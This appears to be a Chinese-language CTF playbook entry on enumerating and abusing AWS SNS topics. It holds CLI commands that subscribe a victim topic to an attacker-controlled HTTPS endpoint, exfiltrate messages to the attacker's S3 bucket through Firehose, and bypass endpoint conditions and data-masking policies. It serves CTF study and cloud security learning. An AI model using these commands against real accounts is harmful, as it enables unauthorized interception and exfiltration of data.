---
category: cloud
tags: [aws, sns, simple_notification_service, topic, subscription, publish, subscribe, email, sqs, firehose, fanout, notification, sns枚举, 消息通知]
triggers: [aws sns, sns topic, sns subscribe, sns publish, notification service, sns:Subscribe, sns:Publish, topic arn, BirthdayPartyInvites, notification channel, firehose exfil, sns endpoint, 消息通知, 订阅, 发布]
related: [cloud/aws_lambda_enum, cloud/aws_s3_enumeration, cloud/aws_api_gateway_recon]
---

# AWS SNS 枚举与滥用

## 什么时候用

题目中出现了 `SNS Topic`、`arn:aws:sns`、`sns:Subscribe`、`sns:Publish`、通知/订阅/邀请邮件机制、`BirthdayPartyInvites` 之类的关键词，或者发现 Lambda/S3 的策略里出现了对 SNS 的引用时，应该从 SNS 视角展开分析。

CTF 里 SNS 最常见的两种角色：
- 作为**通知通道**：题目要求用特定邮箱订阅后才能收到 token / 邀请链接
- 作为**数据外带链路**：利用 Firehose 协议把消息落进 S3，或通过 HTTP/SQS 订阅截获内容

## 前提条件

- 至少知道 topic ARN 或 topic 名称
- 知道当前调用者的权限范围（`sns:Subscribe`、`sns:Publish`、`sns:ListTopics` 等）
- 注意 FIFO topic 只能走 SQS 协议订阅

## 攻击步骤

### 1. 枚举 Topic 和现有订阅

```bash
aws sns list-topics
aws sns list-subscriptions
aws sns list-subscriptions-by-topic --topic-arn <arn>
```

如果有 topic ARN 但没有 list 权限，可以直接尝试 subscribe/publish，根据错误信息判断 topic 是否存在。

### 2. 检查 Topic Policy

Topic policy 决定谁能 `Subscribe` 和 `Publish`。重点看：

- `Principal: "*"` — 是否允许匿名
- `Condition` — 是否限制了 `sns:Endpoint` 格式（如只允许 `*@domain.com`）
- `sns:Protocol` — 是否限制了协议类型

常见的条件绑定：
```json
{
  "Condition": {
    "StringLike": {
      "sns:Endpoint": "*@cloudsecuritychampionship.com"
    }
  }
}
```

这种条件说明只有 endpoint 匹配该模式的订阅才会被接受。

### 3. 根据场景选择攻击路径

**场景 A：需要接收通知（如邀请邮件/token）**

如果 topic 的 Condition 限制了邮箱域名，你不一定需要真的拥有那个邮箱：

- 尝试 `protocol: email` + 指定 endpoint
- 尝试 `protocol: https` + 你控制的服务器
- 尝试 `protocol: sqs` + 你的 SQS 队列（如果 Condition 只约束 email 格式但没覆盖其他协议）

```bash
aws sns subscribe \
  --topic-arn <arn> \
  --protocol https \
  --notification-endpoint https://your-server.com/sns-hook
```

注意：email/https 协议需要确认步骤（会收到含 SubscribeURL 的请求）。

**场景 B：利用 Firehose 协议做数据外带**

如果你有 `sns:Subscribe` 权限且 topic policy 允许：

1. 在你的账户创建 S3 bucket + Firehose 流 + 所需 IAM 角色
2. 用 `firehose` 协议订阅目标 topic
3. 所有后续消息自动落进你的 S3 bucket

```bash
aws sns subscribe \
  --topic-arn "$VICTIM_TOPIC_ARN" \
  --protocol firehose \
  --notification-endpoint "arn:aws:firehose:$REGION:$ACC_ID:deliverystream/$STREAM_NAME" \
  --attributes "SubscriptionRoleArn=$SNS_ROLE_ARN"
```

**场景 C：直接发布消息**

如果有 `sns:Publish` 权限：

```bash
aws sns publish \
  --topic-arn <arn> \
  --message '{"test": "data"}'
```

可以用于触发下游 Lambda、SQS 消费者、或通知其他订阅者。

### 4. 旁路思路

- **FIFO topic** 只支持 SQS 协议，不能用 email/HTTP/firehose
- **Data Protection Policy** 可能会掩码敏感数据（如信用卡号），但如果你有 `sns:PutDataProtectionPolicy`，可以降级为 audit-only 绕过掩码
- **区域问题**：`--topic-arn` 包含区域但你仍然必须用 `--region` 显式指定，否则报权限错误

## 常见坑

- **`sns:Endpoint` 条件不等于不可绕过**
  Condition 通常只匹配 endpoint 字符串格式，不会验证你是否真的拥有该邮箱/URL
- **email 协议需要确认**
  订阅后会收到确认邮件，你必须点击链接才能激活订阅
- **FIFO vs Standard**
  FIFO topic 只能用 SQS 协议，Standard 才支持 email/HTTP/firehose 等
- **区域不匹配是最常见的低级错误**
  返回的错误看起来像权限问题，实际是 `--region` 没对
- **Firehose 外带有延迟**
  数据通常在 60-90 秒后才出现在 S3 bucket 里

## 变体

- **SNS -> Lambda 触发**：通过 Publish 触发下游 Lambda 执行
- **SNS -> SQS fanout**：一条消息同时发给多个 SQS 队列
- **Firehose 外带**：通过 firehose 协议把消息持久化到 S3
- **Data Protection 降级**：绕过消息内容掩码

## 相关技术

- [[cloud/aws_lambda_enum]] — Lambda 经常是 SNS 的下游消费者，topic 的触发目标
- [[cloud/aws_s3_enumeration]] — S3 可能是 Firehose 外带的落盘位置
- [[cloud/aws_api_gateway_recon]] — API Gateway 后面的 Lambda 可能通过 SNS 发通知
